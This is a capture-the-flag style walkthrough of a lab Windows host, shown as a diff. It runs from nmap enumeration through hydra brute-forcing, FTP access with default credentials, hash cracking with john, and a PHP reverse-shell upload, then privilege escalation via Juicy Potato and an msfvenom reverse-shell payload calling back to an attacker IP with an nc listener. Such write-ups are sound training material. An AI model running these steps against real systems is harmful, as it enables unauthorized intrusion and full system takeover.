@@ -1,0 +1,154 @@
+																			                        AuthBy Walkthrough
+																			
+																								
+Attacker's Machine: 192.168.45.169
+Victim's Machine: 192.168.237.46
+export IP=192.168.237.46
+
+nmapAutomator.sh -H $IP -t Full
+
+PORT     STATE SERVICE            VERSION
+21/tcp   open  ftp                zFTPServer 6.0 build 2011-10-17
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| total 9680
+| ----------   1 root     root      5610496 Oct 18  2011 zFTPServer.exe
+| ----------   1 root     root           25 Feb 10  2011 UninstallService.bat
+| ----------   1 root     root      4284928 Oct 18  2011 Uninstall.exe
+| ----------   1 root     root           17 Aug 13  2011 StopService.bat
+| ----------   1 root     root           18 Aug 13  2011 StartService.bat
+| ----------   1 root     root         8736 Nov 09  2011 Settings.ini
+| dr-xr-xr-x   1 root     root          512 Sep 18 01:36 log
+| ----------   1 root     root         2275 Aug 08  2011 LICENSE.htm
+| ----------   1 root     root           23 Feb 10  2011 InstallService.bat
+| dr-xr-xr-x   1 root     root          512 Nov 08  2011 extensions
+| dr-xr-xr-x   1 root     root          512 Nov 08  2011 certificates
+|_dr-xr-xr-x   1 root     root          512 Feb 18  2023 accounts
+242/tcp  open  http               Apache httpd 2.2.21 ((Win32) PHP/5.3.8)
+|_http-server-header: Apache/2.2.21 (Win32) PHP/5.3.8
+|_http-title: 401 Authorization Required
+| http-auth: 
+| HTTP/1.1 401 Authorization Required\x0D
+|_  Basic realm=Qui e nuce nuculeum esse volt, frangit nucem!
+3145/tcp open  zftp-admin         zFTPServer admin
+3389/tcp open  ssl/ms-wbt-server?
+| rdp-ntlm-info: 
+|   Target_Name: LIVDA
+Service Info: OS: Windows;
+
+# Let's check for some interesting info on the zFTP server. In the accounts folder, we found the following possible accounts.
+
+Offsec
+anonymous
+admin
+
+# Let's try to brute-force both FTP services and the web app with hydra and target these 3 account names.
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP ftp -s 21 -e nsr -I
+
+hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt $IP ftp
+
+# we found valid credentials with anonymous / anonymous  and admin / admin
+   Let's login with admin/admin on port 21 and see if we get access to additional info. Port 3145 zFTPServer admin didn't allow access with our discovered credentials.
+   
+ftp $IP 21
+username: admin
+password: admin
+
+dir
+-r--r--r--   1 root     root           76 Nov 08  2011 index.php
+-r--r--r--   1 root     root           45 Nov 08  2011 .htpasswd
+-r--r--r--   1 root     root          161 Nov 08  2011 .htaccess
+
+get index.php
+get .htpasswd
+get .htaccess
+
+# We've managed to find a hash of the user offsec in the file .htpasswd
+
+
+
+# Let's try to crack it using rockyou.txt wordlist
+
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+offsec / elite 
+
+# Good, let's see if we can use these credentials either port zFTP admin or the webapp hosted at port 242, or even on the RDP :D
+
+ zFTP admin            # failed
+ RDP                        # failed
+ webapp                  # works!
+ 
+ 
+ 
+# I've tried to perform enumeration using dirb + credentails, nothing usefull. 
+   But if you have eyes and brains, you notice that on the main page, you have the same text as the one discovered on the index.php file hosted on the FTP Server.
+   This means that we can either create a new php file containing a PHP reverse shell.
+   
+# If you create a msfvenom php reverse shell payload, it doesn't work as well, so let's try ivan's php reverse shell.
+
+https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php   
+
+# Once you upload the file on the zFTP server, we can then access the shell within our browser and obtain a valid session.
+ 
+ 
+ 
+whoami
+livda\apache
+
+cd C:\Users\apache\Desktop
+more local.txt
+2cf90c93c79aa2cdb45ffa094977d0c2
+
+Privilege escalation
+
+systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Network Card(s)" /C:"Hotfix(s)" /c:"System Boot Time" /c:"Windows Directory"
+Host Name:                     LIVDA
+OS Name:                       Microsoft Windows Serverr 2008 Standard 
+OS Version:                    6.0.6001 Service Pack 1 Build 6001
+System Boot Time:          9/18/2023, 10:20:13 AM
+System Type:                  X86-based PC
+Windows Directory:         C:\Windows
+
+whoami /priv
+Privilege Name                             Description                                                   State   
+============================= ===============================
+SeChangeNotifyPrivilege                Bypass traverse checking                            Enabled 
+SeImpersonatePrivilege                 Impersonate a client after authentication       Enabled 
+SeCreateGlobalPrivilege                 Create global objects                                  Enabled 
+SeIncreaseWorkingSetPrivilege       Increase a process working set                    Disabled
+
+# Since this is a older system, 2008 server and x86 architecture, let's go for juicypotato.
+
+https://github.com/ivanitlearning/Juicy-Potato-x86/releases/tag/1.2
+
+# Download the x86 exploit and generate a reverse shell executable and place them both in the same directory.
+
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.173 LPORT=5555 -f exe > shell-x86.exe
+
+
+
+# Get a listener ready on port 5555 and execute Juicypotato
+
+Juicy.Potato.x86.exe -t * -p C:\Users\apache\Desktop\shell-x86.exe -l 443
+
+
+# Aparently we need to find a new CLSID
+
+https://ohpe.it/juicy-potato/CLSID/
+
+# Select the 2008 Server and go first after the CLSID for NT AUTHORITY\SYSTEM
+
+
+
+
+# We got lucky pretty fast, and the first CLSID worked.
+
+Juicy.Potato.x86.exe -t * -p C:\Users\apache\Desktop\shell-x86.exe -l 443 -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}"
+
+
+rlwrap nc -lvnp 5555
+
+cd C:\Users\Administrator\Desktop
+more proof.txt
+f33318052dbc8e77506e48e885ec0fe7
